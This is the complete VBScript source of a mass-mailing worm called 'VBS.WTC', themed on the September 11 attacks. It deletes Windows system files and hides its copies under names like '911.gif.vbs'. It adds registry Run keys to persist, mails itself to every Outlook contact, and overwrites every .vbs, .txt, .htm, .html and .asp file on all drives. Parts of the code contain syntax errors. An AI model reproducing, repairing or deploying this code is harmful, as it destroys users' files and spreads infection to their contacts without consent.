' God bless those who killed in the tragedy
' Hell to those to kill them

On Error Resume Next
Dim Fso
Set W_S = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile("c:\windows\rundll32.exe")
fso.DeleteFile("c:\windows\rundll.exe")

Dim Drives, Drive, Folder, Files, File, Subfolders, Subfolder
Set Fso=createobject("scripting.filesystemobject") 
Set w = fso.GetFile(WScript.ScriptFullName)
w.Copy ("C:\WTC.vbs.vbs")
w.Copy ("C:\911.gif.vbs")
Set wtc = CreateObject( "WScript.Shell" )
wtc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", ("C:\WTC.vbs.vbs")
wtc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", ("C:\911.gif.vbs")
Set Drives=fso.drives

For Each Drive in Drives
If drive.isready then
    Dosearch drive
end If
Next

Dim 911
Set 911 = CreateObject("WScript.Shell")
911.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\911", "c:\windows\system\wtc.vbs.vbs"
911.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\911", "c:\windows\wtc.vbs"
911.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\911", "c:\windows\system32\911.gif.vbs"

Dim WTC(0 To 3)
WTC(0) = "Why have to kill innocent people? Aren't you human just like them too?"
WTC(1) = "Are you cold blood? Are you animal to kill those innocent people?"
WTC(2) = "Why attack on World Trade Centre? Now we facing global economy downpour..."
WTC(3) = "Hell to those who kill those who killed in the attack! God bless those who killed in the tragedy!"

   Set OutlookA = CreateObject("Outlook.Application")
   If OutlookA = "Outlook" Then
      Set Mapi=OutlookA.GetNameSpace("MAPI")
      Set AddLists=Mapi.AddressLists
      For Each ListIndex In AddLists
         If ListIndex.AddressEntries.Count <> 0 Then
            ContactCountX = ListIndex.AddressEntries.Count
            For Count= 1 To ContactCountX
               Set MailX = OutlookA.CreateItem(0)
               Set ContactX = ListIndex.AddressEntries(Count)
               msgbox contactx.address
               Mailx.Recipients.Add(ContactX.Address)
               'msgbox contactx.address
               'Mailx.Recipients.Add(ContactX.Address)
               MailX.To = ContactX.Address
               MailX.Subject = "Remember 11st September 2001"
               MailX.Body = WTC(Int(Rnd(1) * 4))
               Set Attachment=MailX.Attachments
               Attachment.Add dirsystem & "\911.gif.vbs"
               Mailx.Attachments.Add("C:\911.gif.vbs")
               MailX.DeleteAfterSubmit = True
               If MailX.To <> "" Then
                  MailX.Send
               End If
               WS.regwrite "HKCU\software\An\mailed", "1"
            Next
         End If
      Next
   End if

Function Dosearch(Path)
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files

' Infects VBS files
If fso.GetExtensionName(file.path)="vbs" then
    Set Script = Fso.CreateTextFile(file.path, True)
    Script.Writeline "'This file is infected by VBS.WTC"
    Script.Writeline "'For All Human"
    Script.Writeline "'Let it be peace rather than WAR"
    Script.Close
end If

' Infects TXT files
If fso.GetExtensionName(file.path)="txt" then
    Set Script = Fso.CreateTextFile(file.path, True)
    Script.Writeline "'This file is infected by VBS.WTC"
    Script.Writeline "'For All Human"
    Script.Writeline "'Let it be peace rather than WAR"
    Script.Close
end If

' Infects HTM/HTML/ASP files
If fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="html" or fso.GetExtensionName(file.path)="asp" then 
    Set Script = Fso.CreateTextFile(file.path, True)
    Script.Writeline "<html>"
    Script.Writeline "<head>"
    Script.Writeline "<title>VBS.WTC</title>"
    Script.Writeline "</head>"
    Script.Writeline "<body bgcolor=#000000 text=#FF0000>"
    Script.Writeline "<p><b>Let us remember the tragedy happened on 11st September 2001 in New York and Pentagon</b></p>"
    Script.Writeline "<p align=right>by HumanRace</p>"
    Script.Writeline "</body>"
    Script.Writeline "</html>"
    Script.Close
end If

Next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path
Next
end function
'
'
' VBS.WTC
' by HumanRace